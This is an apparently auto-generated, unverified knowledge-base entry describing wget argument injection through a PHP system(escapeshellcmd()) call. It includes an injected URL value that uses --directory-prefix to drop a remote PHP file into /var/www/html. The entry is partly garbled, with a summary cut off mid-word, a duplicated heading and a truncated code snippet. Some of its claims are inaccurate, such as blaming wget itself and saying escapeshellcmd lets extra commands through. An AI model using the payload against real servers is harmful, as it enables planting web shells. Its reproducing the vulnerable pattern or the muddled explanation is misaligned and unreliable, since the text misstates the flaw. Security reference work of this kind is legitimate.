---
id: 4abf4a91-d579-4a1f-85b4-d909038fac9f
name: WGET Argument Injection
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:54.155358+00:00'
updated_at: '2023-04-06T03:55:54.168093+00:00'
tags:
- '[[Argument Injection]]'
- '[[List of exposed commands]]'
- '[[WGET]]'
commands:
- '[[Download file from URL]]'
---

# WGET Argument Injection

## Summary

WGET is a command-line utility for downloading files from the web. Attackers can exploit the argument injection vulnerability in WGET to execute arbitrary commands on the target system. This can lead to unauthorized access, data theft, and other malicious activities. The attacker can use this vulne

## Description

# Description

WGET is a command-line utility for downloading files from the web. Attackers can exploit the argument injection vulnerability in WGET to execute arbitrary commands on the target system. This can lead to unauthorized access, data theft, and other malicious activities. The attacker can use this vulnerability to download and execute malicious files on the target system. This technique is often used in combination with other attack techniques to achieve a specific goal.

## Requirements

1. Access to a vulnerable version of WGET.

## Defense

1. Keep WGET and other command-line utilities up-to-date to prevent known vulnerabilities.

1. Sanitize user input to prevent injection attacks.

1. Implement access controls to limit the ability of attackers to execute commands on the target system.

## Objectives

1. Execute arbitrary commands on the target system.

1. Download and execute malicious files on the target system.

# Instructions

1. The system command is used to execute the wget command with the URL as an argument. The escapeshellcmd function is used to escape any characters that can be used to inject additional commands.

**Code**: [[system(escapeshellcmd('wget '.$url));]]

> The attacker can modify the URL parameter to include additional commands that will be executed by the system command. This can be used to execute arbitrary commands on the target system.

2. The --directory-prefix option is used to specify the directory where the downloaded file will be saved. The attacker can use this option to write arbitrary files to the target system.

**Code**: [[$url = '--directory-prefix=/var/www/html http://ex]]

> The attacker can modify the --directory-prefix option to write the downloaded file to a different directory, including sensitive system directories. This can be used to write malicious files to the target system and execute them.

**Command** ([[Download file from URL]]):

```bash
$url = '--directory-prefix=/var/www/html http://example.com/example.php';
```

## Commands Used

- [[Download file from URL]]

## Tags

- [[Argument Injection]]
- [[List of exposed commands]]
- [[WGET]]
